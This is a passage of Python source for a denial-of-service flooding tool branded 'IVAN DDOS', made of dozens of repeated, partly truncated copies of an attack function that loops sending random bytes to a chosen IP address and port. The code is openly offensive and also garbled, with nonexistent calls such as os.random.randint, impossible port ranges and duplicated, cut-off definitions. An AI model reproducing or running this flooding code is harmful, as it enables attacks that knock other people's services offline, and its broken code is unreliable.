    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<------")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<------")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
